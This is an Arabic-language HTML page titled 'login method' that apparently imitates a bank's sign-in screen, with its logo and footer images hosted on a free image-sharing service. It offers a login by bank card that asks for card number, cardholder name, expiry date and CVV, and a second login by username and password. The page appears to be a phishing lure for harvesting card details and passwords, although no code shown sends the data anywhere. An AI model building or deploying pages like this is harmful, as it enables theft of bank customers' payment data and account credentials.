<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>طريقة التسجيل</title>
    <style>
        body { font-family: sans-serif; background-color: #f4f4f4; margin: 0; padding-top: 70px; display: flex; flex-direction: column; min-height: 100vh; }
        
        .header { position: fixed; top: 0; width: 100%; display: flex; justify-content: space-between; align-items: center; padding: 10px 25px; background-color: #ffffff; border-bottom: 2px solid #8C0032; z-index: 1000; box-sizing: border-box; }
        .logo { height: 40px; }
        .menu-icon { font-size: 28px; color: #8C0032; cursor: pointer; }
        .lang-btn { background: transparent; color: #8C0032; border: 2px solid #8C0032; padding: 5px 15px; border-radius: 5px; font-weight: bold; cursor: pointer; }

        .container { padding: 20px; flex: 1; }
        
        .selection-box { background: white; border: 2px solid #ddd; border-radius: 10px; padding: 20px; margin-bottom: 15px; cursor: pointer; text-align: center; transition: 0.3s; }
        .selection-box.active { border-color: #8C0032; background-color: #fff9f9; }
        .selection-box h3 { margin: 0 0 10px 0; color: #333; }
        .selection-box p { margin: 0; color: #8C0032; font-weight: bold; }

        .form-section { background: white; padding: 20px; border-radius: 10px; display: none; margin-top: 15px; }
        .form-section.active { display: block; }
        .form-group { margin-bottom: 15px; }
        label { display: block; margin-bottom: 5px; font-weight: bold; }
        input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
        .submit-btn { background: #8C0032; color: white; padding: 15px; width: 100%; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        
        .footer-image { width: 100%; display: block; margin-top: 20px; }
    </style>
</head>
<body>

    <header class="header">
        <div class="menu-icon">&#9776;</div>
        <img src="https://i.ibb.co/5XVcXsGs/1dd76f2f664441de0899c73896f966f1.jpg" class="logo">
        <a href="login_method_en.html" class="lang-btn" style="text-decoration: none;">English</a>
    </header>

    <div class="container">
        <div id="boxCard" class="selection-box" onclick="selectMethod('card')">
            <h3>تسجيل الدخول</h3>
            <p>البطاقة البنكية</p>
        </div>

        <div id="boxUser" class="selection-box" onclick="selectMethod('user')">
            <h3>تسجيل الدخول</h3>
            <p>باسم المستخدم وكلمة المرور</p>
        </div>

        <div id="formCard" class="form-section">
            <div class="form-group"><label>رقم البطاقة</label><input type="number" placeholder="XXXX XXXX XXXX XXXX"></div>
            <div class="form-group"><label>اسم صاحب البطاقة</label><input type="text" placeholder="Cardholder Name"></div>
            <div style="display: flex; gap: 10px;">
                <div class="form-group" style="flex:1"><label>تاريخ الانتهاء</label><input type="text" placeholder="MM/YY"></div>
                <div class="form-group" style="flex:1"><label>CVV</label><input type="number" placeholder="XXX"></div>
            </div>
            <button class="submit-btn">متابعة</button>
        </div>

        <div id="formUser" class="form-section">
            <div class="form-group"><label>اسم المستخدم</label><input type="text" placeholder="Username"></div>
            <div class="form-group"><label>كلمة المرور</label><input type="password" placeholder="Password"></div>
            <button class="submit-btn">متابعة</button>
        </div>
    </div>

    <!-- الفوتر الجديد -->
    <a href="https://ibb.co/ZzYgPMSf"><img src="https://i.ibb.co/23sMQkSF/IMG-20260714-WA0015.jpg" alt="Footer" class="footer-image"></a>

    <script>
        function selectMethod(type) {
            document.getElementById('boxCard').classList.remove('active');
            document.getElementById('boxUser').classList.remove('active');
            document.getElementById('formCard').classList.remove('active');
            document.getElementById('formUser').classList.remove('active');

            if(type === 'card') {
                document.getElementById('boxCard').classList.add('active');
                document.getElementById('formCard').classList.add('active');
            } else {
                document.getElementById('boxUser').classList.add('active');
                document.getElementById('formUser').classList.add('active');
            }
        }
    </script>
</body>
</html>
